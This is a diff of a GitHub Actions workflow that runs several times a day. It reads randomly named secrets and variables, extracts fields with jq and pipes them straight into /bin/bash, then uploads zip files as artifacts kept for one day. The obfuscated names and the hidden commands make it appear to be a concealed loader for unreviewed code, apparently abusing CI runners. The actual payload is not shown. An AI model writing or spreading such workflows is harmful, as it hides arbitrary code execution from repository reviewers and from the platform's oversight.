@@ -1,29 +1,30 @@
 name: monolithvincentbeta
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '37 4/6 * * *'
 
+  schedule:
+    - cron: '17 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: monolithvincentbeta
         env:
-          yfr993: ${{ secrets.yfr993 }}
+          huroo9: ${{ secrets.huroo9 }}
         run: |
-          echo $yfr993 | jq -r .ie0633 | /bin/bash
-          echo $jpkl898 | jq -r .gbj532 | /bin/bash
-          echo $jvsnc70 | jq -r .zn57 | /bin/bash
-          echo $z8654 | jq -r .jys673 | /bin/bash
-          echo $oobz4515 | jq -r .p91482 | /bin/bash
-          echo $fsx6824 | jq -r .gm7 | /bin/bash
-          echo $hm624 | jq -r .wmfuj50562 | /bin/bash
-          echo $xb14422 | jq -r .cra2290 | /bin/bash
-          echo $fmbtn23 | jq -r .geuhj875 | /bin/bash
-          echo $obtn85 | jq -r .cvz44721 | /bin/bash
-          echo $eekhx5 | jq -r .jwb487 | /bin/bash
+          printf '%s' "$huroo9" | jq -r .hcpc69395 | /bin/bash
+          printf '%s' "$nr2248" | jq -r .faqu5791 | /bin/bash
+          printf '%s' "$l8" | jq -r .dfzbt2542 | /bin/bash
+          echo $kq71 | jq -r .lr70 | /bin/bash
+          echo $ydnd2 | jq -r .x0 | /bin/bash
+          printf '%s' "$lrfl54" | jq -r .reg7 | /bin/bash
+          echo $qi5 | jq -r .mh9178 | /bin/bash
+          echo $cbp398 | jq -r .z6 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vawEUxsR
+          path: "*.zip"
+          retention-days: 1
